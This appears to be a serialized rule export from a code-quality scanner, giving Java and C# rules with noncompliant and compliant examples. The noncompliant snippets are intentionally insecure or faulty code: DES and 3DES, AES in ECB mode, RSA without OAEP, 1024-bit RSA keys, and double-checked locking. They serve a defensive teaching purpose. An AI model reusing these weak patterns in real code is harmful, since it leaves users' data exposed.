  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
¥

java:S2168•
javaS2168)Double-checked locking should not be used"BLOCKER*java:÷<p>Double-checked locking is the practice of checking a lazy-initialized object's state both before and after a <code>synchronized</code> block is
entered to determine whether or not to initialize the object.</p>
<p>It does not work reliably in a platform-independent manner without additional synchronization for mutable instances of anything other than
<code>float</code> or <code>int</code>. Using double-checked locking for the lazy initialization of any other type of primitive or mutable object
risks a second thread using an uninitialized or partially initialized member while the first thread is still creating it, and crashing the
program.</p>
<p>There are multiple ways to fix this. The simplest one is to simply not use double checked locking at all, and synchronize the whole method instead.
With early versions of the JVM, synchronizing the whole method was generally advised against for performance reasons. But <code>synchronized</code>
performance has improved a lot in newer JVMs, so this is now a preferred solution. If you prefer to avoid using <code>synchronized</code> altogether,
you can use an inner <code>static class</code> to hold the reference instead. Inner static classes are guaranteed to load lazily.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@NotThreadSafe
public class DoubleCheckedLocking {
    private static Resource resource;

    public static Resource getInstance() {
        if (resource == null) {
            synchronized (DoubleCheckedLocking.class) {
                if (resource == null)
                    resource = new Resource();
            }
        }
        return resource;
    }

    static class Resource {

    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@ThreadSafe
public class SafeLazyInitialization {
    private static Resource resource;

    public static synchronized Resource getInstance() {
        if (resource == null)
            resource = new Resource();
        return resource;
    }

    static class Resource {
    }
}
</pre>
<p>With inner static holder:</p>
<pre>
@ThreadSafe
public class ResourceFactory {
    private static class ResourceHolder {
        public static Resource resource = new Resource(); // This will be lazily initialised
    }

    public static Resource getResource() {
        return ResourceFactory.ResourceHolder.resource;
    }

    static class Resource {
    }
}
</pre>
<p>Using "volatile":</p>
<pre>
class ResourceFactory {
  private volatile Resource resource;

  public Resource getResource() {
    Resource localResource = resource;
    if (localResource == null) {
      synchronized (this) {
        localResource = resource;
        if (localResource == null) {
          resource = localResource = new Resource();
        }
      }
    }
    return localResource;
  }

  static class Resource {
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html">The "Double-Checked Locking is Broken" Declaration</a> </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/IgAZAg">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/609.html">MITRE, CWE-609</a> - Double-checked locking </li>
  <li> <a href="https://docs.oracle.com/javase/specs/jls/se7/html/jls-12.html#jls-12.4">JLS 12.4</a> - Initialization of Classes and Interfaces </li>
  <li> Wikipedia: <a href="https://en.wikipedia.org/wiki/Double-checked_locking#Usage_in_Java">Double-checked locking</a> </li>
</ul>ZBUG
Ê

java:S3014◊
javaS3014 "ThreadGroup" should not be used"BLOCKER*java:ä<p>There is little valid reason to use the methods of the <code>ThreadGroup</code> class. Some are deprecated (<code>allowThreadSuspension()</code>,
<code>resume()</code>, <code>stop()</code>, and <code>suspend()</code>), some are obsolete, others aren't thread-safe, and still others are insecure
(<code>activeCount()</code>, <code>enumerate()</code>) . For these reasons, any use of <code>ThreadGroup</code> is suspicious and should be
avoided.</p>
<h2>Compliant Solution</h2>
<pre>
ThreadFactory threadFactory = Executors.defaultThreadFactory();
ThreadPoolExecutor executorPool = new ThreadPoolExecutor(3, 10, 5, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;(2), threadFactory);

for (int i = 0; i &lt; 10; i++) {
  executorPool.execute(new JobThread("Job: " + i));
}

System.out.println(executorPool.getActiveCount()); // Compliant
executorPool.shutdown();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RQCHAQ">CERT, THI01-J.</a> - Do not invoke ThreadGroup methods </li>
</ul>Z
CODE_SMELL
±


java:S3374¢

javaS33740Struts validation forms should have unique names"BLOCKER*java:¬	<p>According to the Common Weakness Enumeration,</p>
<blockquote>
  If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the
  other. This decision might not correspond to the programmer's expectations...
</blockquote>
<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/102.html">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms </li>
  <li> <a href="https://www.owasp.org/index.php/Struts:_Duplicate_Validation_Forms#Struts:_Duplicate_Validation_Forms">OWASP, Improper Data
  Validation</a> - Struts: Duplicate Validation Forms </li>
</ul>ZVULNERABILITY
Û

java:S1190‰
javaS1190+Future keywords should not be used as names"BLOCKER*java:å<p>Through Java's evolution keywords have been added. While code that uses those words as identifiers may be compilable under older versions of Java,
it will not be under modern versions. </p>
<p>Following keywords are marked as invalid identifiers </p>
<table>
  <tbody>
    <tr>
      <th>Keyword</th>
      <th>Added</th>
    </tr>
    <tr>
      <td><code>_</code></td>
      <td>9</td>
    </tr>
    <tr>
      <td><code>enum</code></td>
      <td>5.0</td>
    </tr>
  </tbody>
</table>
<p><code>assert</code> and <code>strictfp</code> are another example of valid identifiers which became keywords in later versions, but are not
supported by this rule.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
  int enum = 42;            // Noncompliant
  String _ = "";   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething() {
  int magic = 42;
}
</pre>Z
CODE_SMELL
∆

java:S2178∑
javaS21786Short-circuit logic should be used in boolean contexts"BLOCKER*java:‘<p>The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are
evaluated under the wrong circumstances. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(getTrue() | getFalse()) { ... } // Noncompliant; both sides evaluated
</pre>
<h2>Compliant Solution</h2>
<pre>
if(getTrue() || getFalse()) { ... } // true short-circuit logic
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/g4FtAg">CERT, EXP46-C.</a> - Do not use a bitwise operator with a Boolean-like operand
  </li>
</ul>Z
CODE_SMELL
é

java:S2096ˇ
javaS2096""main" should not "throw" anything"BLOCKER*java:∞<p>There's no reason for a <code>main</code> method to <code>throw</code> anything. After all, what's going to catch it? </p>
<p>Instead, the method should itself gracefully handle any exceptions that may bubble up to it, attach as much contextual information as possible, and
perform whatever logging or user communication is necessary, and <code>exit</code> with a non-zero (i.e. non-success) exit code if necessary.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String args[]) throws Exception { // Noncompliant
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String args[]) {
 try {
    doSomething();
  } catch (Throwable t) {
    log.error(t);
    System.exit(1);  // Default exit code, 0, indicates success. Non-zero value means failure.
  }
}
</pre>Z
CODE_SMELL
‘

java:S2095≈
javaS2095Resources should be closed"BLOCKER*java:Ö<p>Connections, streams, files, and other classes that implement the <code>Closeable</code> interface or its super-interface,
<code>AutoCloseable</code>, needs to be closed after use. Further, that <code>close</code> call must be made in a <code>finally</code> block otherwise
an exception could keep the call from being made. Preferably, when class implements <code>AutoCloseable</code>, resource should be created using
"try-with-resources" pattern and will be closed automatically.</p>
<p>Failure to properly close resources will result in a resource leak which could bring first the application and then perhaps the box it's on to
their knees.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void readTheFile() throws IOException {
  Path path = Paths.get(this.fileName);
  BufferedReader reader = Files.newBufferedReader(path, this.charset);
  // ...
  reader.close();  // Noncompliant
  // ...
  Files.lines("input.txt").forEach(System.out::println); // Noncompliant: The stream needs to be closed
}

private void doSomething() {
  OutputStream stream = null;
  try {
    for (String property : propertyList) {
      stream = new FileOutputStream("myfile.txt");  // Noncompliant
      // ...
    }
  } catch (Exception e) {
    // ...
  } finally {
    stream.close();  // Multiple streams were opened. Only the last is closed.
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void readTheFile(String fileName) throws IOException {
    Path path = Paths.get(fileName);
    try (BufferedReader reader = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
      reader.readLine();
      // ...
    }
    // ..
    try (Stream&lt;String&gt; input = Files.lines("input.txt"))  {
      input.forEach(System.out::println);
    }
}

private void doSomething() {
  OutputStream stream = null;
  try {
    stream = new FileOutputStream("myfile.txt");
    for (String property : propertyList) {
      // ...
    }
  } catch (Exception e) {
    // ...
  } finally {
    stream.close();
  }
}
</pre>
<h2>Exceptions</h2>
<p>Instances of the following classes are ignored by this rule because <code>close</code> has no effect:</p>
<ul>
  <li> <code>java.io.ByteArrayOutputStream</code> </li>
  <li> <code>java.io.ByteArrayInputStream</code> </li>
  <li> <code>java.io.CharArrayReader</code> </li>
  <li> <code>java.io.CharArrayWriter</code> </li>
  <li> <code>java.io.StringReader</code> </li>
  <li> <code>java.io.StringWriter</code> </li>
</ul>
<p>Java 7 introduced the try-with-resources statement, which implicitly closes <code>Closeables</code>. All resources opened in a try-with-resources
statement are ignored by this rule. </p>
<pre>
try (BufferedReader br = new BufferedReader(new FileReader(fileName))) {
  //...
}
catch ( ... ) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/772.html">MITRE, CWE-772</a> - Missing Release of Resource after Effective Lifetime </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gFqAQ">CERT, FIO04-J.</a> - Release resources when they are no longer needed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/GAGQBw">CERT, FIO42-C.</a> - Close files when they are no longer needed </li>
  <li> <a href="https://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html">Try With Resources</a> </li>
</ul>ZBUG
Ã
csharpsquid:S3433∂
csharpsquidS3433(Test method signatures should be correct"BLOCKER*cs:‹
<p>A method is detected as test method if marked with one of the following attributes <code>[TestMethod]</code> or <code>[DataTestMethod]</code> (for
mstest), <code>[Fact]</code> or <code>[Theory]</code> (for xunit) or <code>[Test]</code>, <code>[TestCase]</code>, <code>[TestCaseSource]</code> or
<code>[Theory]</code> (for nunit). However, whether or not they have a test attribute, non-<code>public</code> methods are not recognized as tests,
and therefore not executed. Neither are <code>async</code> <code>void</code> methods, or methods with generics anywhere in their signatures. </p>
<h2>Noncompliant Code Example</h2>
<pre>
[TestMethod]
void TestNullArg()  // Noncompliant; method is not public
{  /* ... */  }

[TestMethod]
public async void MyIgnoredTestMethod()  // Noncompliant; this is an 'async void' method
{ /* ... */ }

[TestMethod]
public void MyIgnoredGenericTestMethod&lt;T&gt;(T foo)  // Noncompliant; method has generics in its signature
{ /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestMethod]
public void TestNullArg()
{  /* ... */  }
</pre>
<h2>Exceptions</h2>
<p>Accessibility is ignored for xUnit <code>Fact</code> test methods, since they do not need to be <code>public</code>.</p>
<p><code>[Theory]</code> test methods in xUnit and <code>[TestCase]</code> and <code>[TestCaseSource]</code> test methods in nunit can be generic.</p>Z
CODE_SMELL
Æ
csharpsquid:S1147ò
csharpsquidS1147!Exit methods should not be called"BLOCKER*cs:≈<p>Calling <code>Environment.Exit(exitCode)</code> or <code>Application.Exit()</code> terminates the process and returns an exit code to the operating
system..</p>
<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole application.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Environment.Exit(0);
Application.Exit();
</pre>
<h2>Exceptions</h2>
<p>These methods are ignored inside <code>Main</code>.</p>Z
CODE_SMELL
°
csharpsquid:S3443ã
csharpsquidS34436Type should not be examined on "System.Type" instances"BLOCKER*cs:£<p>If you call <code>GetType()</code> on a <code>Type</code> variable, the return value will always be <code>typeof(System.Type)</code>. So there's no
real point in making that call. The same applies to passing a type argument to <code>IsInstanceOfType</code>. In both cases the results are entirely
predictable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var type = typeof(int);
var ttype = type.GetType(); //Noncompliant, always typeof(System.Type)

var s = "abc";

if (s.GetType().IsInstanceOfType(typeof(string))) //Noncompliant; false
{ /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
var s = "abc";

if (s.GetType().IsInstanceOfType("ssss"))
{ /* ... */ }
</pre>Z
CODE_SMELL
”
csharpsquid:S2699Ω
csharpsquidS2699Tests should include assertions"BLOCKER*cs:Ï<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the
code under test.</p>
<p>This rule raises an exception when no assertions from any of the following frameworks are found in a test:</p>
<ul>
  <li> <code>MSTest</code> </li>
  <li> <code>NUnit</code> </li>
  <li> <code>XUnit</code> </li>
  <li> <code>FluentAssertions</code> (4.x and 5.x) </li>
  <li> <code>NSubstitute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[TestMethod]
public void MyMethod_WhenSomething_ExpectsSomething()
{
    var myClass = new Class();
    var result = myClass.GetFoo();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestMethod]
public void MyMethod_WhenSomething_ExpectsSomething()
{
    var myClass = new Class();
    var result = myClass.GetFoo();
    Assert.IsTrue(result);
}
</pre>Z
CODE_SMELL
≈
csharpsquid:S3427Ø
csharpsquidS3427AMethod overloads with default parameter values should not overlap"BLOCKER*cs:º<p>The rules for method resolution are complex and perhaps not properly understood by all coders. Having overloads with optional parameter values
makes the matter even harder to understand. </p>
<p>This rule raises an issue when an overload with default parameter values is hidden by one without the optional parameters. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  void Print(string[] messages) {...}
  void Print(string[] messages, string delimiter = "\n") {...} // Noncompliant; default parameter value is hidden by overload
}

// ...
MyClass myClass = new MyClass();

myClass.Print(new string[3] {"yes", "no", "maybe"});  // which version of Print will be called?
</pre>Z
CODE_SMELL
ç	
csharpsquid:S3237˜
csharpsquidS3237!"value" parameters should be used"BLOCKER*cs:§<p>In property and indexer <code>set</code> methods, and in event <code>add</code> and <code>remove</code> methods, the implicit <code>value</code>
parameter holds the value the accessor was called with. Not using the <code>value</code> means that the accessor ignores the caller's intent which
could cause unexpected results at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private int count;
public int Count
{
  get { return count; }
  set { count = 42; } // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private int count;
public int Count
{
  get { return count; }
  set { count = value; }
}
</pre>
<p>or</p>
<pre>
public int Count
{
  get { return count; }
  set { throw new InvalidOperationException(); }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the setter is empty and part of the implementation of an <code>interface</code> . The assumption is that this
part of the interface is not meaningful to that particular implementation. A good example of that would be a "sink" logger that discards any logs.</p>Z
CODE_SMELL
ÿ	
csharpsquid:S2387¬	
csharpsquidS23878Child class fields should not shadow parent class fields"BLOCKER*cs:ÿ<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you'll get confusion at
best, chaos at worst. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit
{
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry : Fruit
{
  private bool ripe; // Noncompliant
  private static Color FLESH; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit
{
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry : Fruit
{
  private bool ripened;
  private static Color FLESH_COLOR;
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. It also ignores <code>private</code> parent
class fields, but in all other such cases, the child class field should be renamed.</p>
<pre>
public class Fruit
{
  private Season ripe;
  // ...
}

public class Raspberry : Fruit
{
  private Season ripe;  // Compliant as parent field 'ripe' is anyway not visible from Raspberry
  // ...
}
</pre>Z
CODE_SMELL
©
csharpsquid:S2278ì
csharpsquidS2278GNeither DES (Data Encryption Standard) nor DESede (3DES) should be used"BLOCKER*cs:ó<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using (var tripleDES = new TripleDESCryptoServiceProvider()) //Noncompliant
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using (var aes = new AesCryptoServiceProvider())
{
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS5547'>S5547</a> instead.</p>ZVULNERABILITY
≠
csharpsquid:S5542ó
csharpsquidS5542HEncryption algorithms should be used with secure mode and padding scheme"BLOCKER*cs:ö<p>To perform secure cryptography, operation modes and padding scheme are essentials and should be used correctly according to the encryption
algorithm:</p>
<ul>
  <li> For block cipher encryption algorithms (like AES, blowfish ...), the GCM (Galois Counter Mode) mode, witch <a
  href="https://en.wikipedia.org/wiki/Galois/Counter_Mode#Mathematical_basis">works internally</a> with zero/no padding scheme, is recommended. At the
  opposite, these modes and/or schemes are highly discouraged:
    <ul>
      <li> Electronic Codebook (ECB) mode is vulnerable because it doesn't provide serious message confidentiality: under a given key any given
      plaintext block always gets encrypted to the same ciphertext block. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
  <li> RSA encryption algorithm should be used with the recommended padding scheme (OAEP) </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesmanaged?view=netframework-4.8">AesManaged</a> object with
insecure mode:</p>
<pre>
AesManaged aes4 = new AesManaged
{
  KeySize = 128,
  BlockSize = 128,
  Mode = CipherMode.ECB, // Noncompliant
  Padding = PaddingMode.PKCS7
};
</pre>
<p><a
href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider?view=netframework-4.8">RSACryptoServiceProvider</a>
object without OAEP padding:</p>
<pre>
RSACryptoServiceProvider RSA1 = new RSACryptoServiceProvider();
encryptedData = RSA1.Encrypt(dataToEncrypt, false); // Noncompliant: OAEP Padding is not used (second parameter set to false)
</pre>
<h2>Compliant Solution</h2>
<p>AES with GCM mode with <a href="https://www.bouncycastle.org/">bouncycastle</a> library: </p>
<pre>
GcmBlockCipher blockCipher = new GcmBlockCipher(new AesFastEngine()); // Compliant
blockCipher.Init(true, new AeadParameters(new KeyParameter(secretKey), 128, iv, null));
</pre>
<p>AES with GCM mode with <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=netcore-3.0">AesGcm</a>
object: </p>
<pre>
var aesGcm = new AesGcm(key); // Compliant
</pre>
<p>RSA with OAEP padding with <a
href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider?view=netframework-4.8">RSACryptoServiceProvider</a>
object: </p>
<pre>
RSACryptoServiceProvider RSA2 = new RSACryptoServiceProvider();
encryptedData = RSA2.Encrypt(dataToEncrypt, true); // Compliant: OAEP Padding is used (second parameter set to true)
</pre>
<p> </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
Ç
csharpsquid:S2275Ï
csharpsquidS2275JComposite format strings should not lead to unexpected behavior at runtime"BLOCKER*cs:˜<p>Because composite format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that lead to unexpected
behaviors or runtime errors. This rule statically validates the good behavior of composite formats when calling the methods of
<code>String.Format</code>, <code>StringBuilder.AppendFormat</code>, <code>Console.Write</code>, <code>Console.WriteLine</code>,
<code>TextWriter.Write</code>, <code>TextWriter.WriteLine</code>, <code>Debug.WriteLine(String,‚ÄÇObject[])</code>,
<code>Trace.TraceError(String,‚ÄÇObject[])</code>, <code>Trace.TraceInformation(String,‚ÄÇObject[])</code>,
<code>Trace.TraceWarning(String,‚ÄÇObject[])</code> and <code>TraceSource.TraceInformation(String,‚ÄÇObject[])</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
s = string.Format("[0}", arg0);
s = string.Format("{{0}", arg0);
s = string.Format("{0}}", arg0);
s = string.Format("{-1}", arg0);
s = string.Format("{0} {1}", arg0);
</pre>
<h2>Compliant Solution</h2>
<pre>
s = string.Format("{0}", 42); // Compliant
s = string.Format("{0,10}", 42); // Compliant
s = string.Format("{0,-10}", 42); // Compliant
s = string.Format("{0:0000}", 42); // Compliant
s = string.Format("{2}-{0}-{1}", 1, 2, 3); // Compliant
s = string.Format("no format"); // Compliant
</pre>
<h2>Exceptions</h2>
<ul>
  <li> No issue is raised if the format string is not a <code>const</code>. </li>
</ul>
<pre>
var pattern = "{0} {1} {2}";
var res = string.Format(pattern, 1, 2); // Compliant, not const string are not recognized
</pre>
<ul>
  <li> No issue is raised if the argument is not an inline creation array. </li>
</ul>
<pre>
var array = new int[] {};
var res = string.Format("{0} {1}", array); // Compliant we don't know the size of the array
</pre>
<ul>
  <li> This rule doesn't check whether the format specifier (defined after the <code>:</code>) is actually valid. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
</ul>ZBUG
ï	
csharpsquid:S2953ˇ
csharpsquidS2953>Methods named "Dispose" should implement "IDisposable.Dispose""BLOCKER*cs:è<p><code>Dispose</code> as a method name should be used exclusively to implement <code>IDisposable.Dispose</code> to prevent any confusion.</p>
<p>It may be tempting to create a <code>Dispose</code> method for other purposes, but doing so will result in confusion and likely lead to problems in
production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class GarbageDisposal
{
  private int Dispose()  // Noncompliant
  {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class GarbageDisposal : IDisposable
{
  public void Dispose()
  {
    // ...
  }
}
</pre>
<p>or</p>
<pre>
public class GarbageDisposal
{
  private int Grind()
  {
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>Methods named <code>Dispose</code> and invoked from the <code>IDisposable.Dispose</code> implementation are not reported.</p>
<pre>
public class GarbageDisposal  :  IDisposable
{
  protected virtual void Dispose(bool disposing)
  {
    //...
  }
  public void Dispose()
  {
    Dispose(true);
    GC.SuppressFinalize(this);
  }
}
</pre>Z
CODE_SMELL
Ù
csharpsquid:S2368ﬁ
csharpsquidS2368@Public methods should not have multidimensional array parameters"BLOCKER*cs:Ï<p>Exposing methods with multidimensional array parameters requires developers to have advanced knowledge about the language in order to be able to
use them. Moreover, what exactly to pass to such parameters is not intuitive. Therefore, such methods should not be exposed, but can be used
internally.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Program
{
    public void WriteMatrix(int[][] matrix) // Non-Compliant
    {
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Matrix
{
    // ...
}

public class Program
{
    public void WriteMatrix(Matrix matrix) // Compliant
    {
    }
}
</pre>Z
CODE_SMELL
®
csharpsquid:S4426í
csharpsquidS4426*Cryptographic keys should not be too short"BLOCKER*cs:≥<p>When generating cryptograpic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force attacks. For
the RSA algorithm the key should be at </p>
<p> least 2048 bits long.</p>
<p>This rule raises an issue when a RSA key-pair generator is initialized with too small a length parameter.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Security.Cryptography;

namespace MyLibrary
{
    public class MyCryptoClass
    {
        static void Main()
        {
            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(1024); // Noncompliant
            // ...
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Security.Cryptography;

namespace MyLibrary
{
    public class MyCryptoClass
    {
        static void Main()
        {
            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
            // ...
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
  Misconfiguration </li>
  <li> <a href="https://www.ssi.gouv.fr/uploads/2014/11/RGS_v-2-0_B1.pdf">ANSSI RGSv2</a> - R√©f√©rentiel G√©n√©ral de S√©curit√© version 2 </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf">NIST FIPS 186-4</a> - Digital Signature Standard (DSS) </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BLOWFISH_KEY_SIZE">BLOWFISH_KEY_SIZE</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#RSA_KEY_SIZE">RSA_KEY_SIZE</a> </li>
</ul>ZVULNERABILITY
ä
csharpsquid:S3693Ù
csharpsquidS36932Exception constructors should not throw exceptions"BLOCKER*cs:ó<p>It may be a good idea to raise an exception in a constructor if you're unable to fully flesh the object in question, but not in an
<code>exception</code> constructor. If you do, you'll interfere with the exception that was originally being thrown. Further, it is highly unlikely
that an exception raised in the creation of an exception will be properly handled in the calling code, and the unexpected, unhandled exception will
lead to program termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyException: Exception
{
    public void MyException()
    {
         if (bad_thing)
         {
             throw new Exception("A bad thing happened");  // Noncompliant
          }
    }
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
ñ
csharpsquid:S1048Ä
csharpsquidS1048'Destructors should not throw exceptions"BLOCKER*cs:Æ<p>If Finalize or an override of Finalize throws an exception, and the runtime is not hosted by an application that overrides the default policy, the
runtime terminates the process immediately without graceful cleanup (finally blocks and finalizers are not executed). This behavior ensures process
integrity if the finalizer cannot free or destroy resources.</p>
<p>The rule reports on throw statements used in finalizers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
    ~MyClass()
    {
        throw new NotImplementedException(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
    ~MyClass()
    {
        // no throw
    }
}
</pre>ZBUG
ˇ 
csharpsquid:S2930È 
csharpsquidS2930!"IDisposables" should be disposed"BLOCKER*cs:ù <p>When writing managed code, you don't need to worry about allocating or freeing memory: The garbage collector takes care of it. For efficiency
reasons, some objects such as <code>Bitmap</code> use unmanaged memory, enabling for example the use of pointer arithmetic. Such objects have
potentially huge unmanaged memory footprints, but will have tiny managed ones. Unfortunately, the garbage collector only sees the tiny managed
footprint, and fails to reclaim the unmanaged memory (by calling <code>Bitmap</code>'s finalizer method) in a timely fashion. </p>
<p>Moreover, memory is not the only system resource which needs to be managed in a timely fashion: The operating system can only handle having so many
file descriptors (e.g. <code>FileStream</code>) or sockets (e.g. <code>WebClient</code>) open at any given time. Therefore, it is important to
<code>Dispose</code> of them as soon as they are no longer needed, rather than relying on the garbage collector to call these objects' finalizers at
some nondeterministic point in the future.</p>
<p>This rule tracks <code>private</code> fields and local variables of the following <code>IDisposable</code> types, which are never disposed, closed,
aliased, returned, or passed to other methods.</p>
<ul>
  <li> <code>System.IO</code> namespace
    <ul>
      <li> <code>System.IO.FileStream</code> </li>
      <li> <code>System.IO.StreamReader</code> </li>
      <li> <code>System.IO.StreamWriter</code> </li>
    </ul> </li>
